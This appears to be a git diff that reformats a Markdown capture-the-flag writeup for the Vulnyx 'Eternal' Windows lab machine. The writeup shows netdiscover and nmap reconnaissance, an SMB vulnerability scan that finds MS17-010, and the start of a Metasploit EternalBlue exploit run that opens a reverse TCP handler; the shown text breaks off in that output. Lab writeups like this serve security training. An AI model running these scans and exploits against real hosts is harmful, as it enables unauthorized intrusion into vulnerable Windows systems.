@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Eternal 
+---
+icon: windows
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Windows  
+# Eternal ​​
 
-> **Tags:** `Windows` `SMB` `NSE Scripts` `MS17-010` `EternalBlue` `Metasploit` `Kernel Exploit` 
+## 🖥️ Writeup - Eternal
 
-# INSTALLATION
+**Platform:** Vulnyx\
+**Operating System:** Windows
+
+> **Tags:** `Windows` `SMB` `NSE Scripts` `MS17-010` `EternalBlue` `Metasploit` `Kernel Exploit`
+
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Eternal machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Eternal machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Eternal, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,19 +38,20 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:d6:2a:7d      1      60  PCS Systemtechnik GmbH      
  10.0.4.32       08:00:27:14:62:18      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.32`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.32
-``` 
+```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 22:57 CET
 Nmap scan report for 10.0.4.32
@@ -76,6 +85,7 @@ sudo nmap -p445 --script="smb-vuln-*" 10.0.4.32
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 23:03 CET
 Nmap scan report for 10.0.4.32
@@ -110,7 +120,7 @@ We discover that the target is susceptible to `MS17-010`, commonly known as `Ete
 
 We are aware that several `Metasploit` modules exist to target this vulnerability.
 
-# METASPLOIT
+## METASPLOIT
 
 ```bash
 msfconsole
@@ -126,6 +136,7 @@ msf exploit(windows/smb/ms17_010_eternalblue) > run
 ```
 
 Info:
+
 ```
 [*] Started reverse TCP handler on 10.0.4.12:4444 
 [*] 10.0.4.32:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
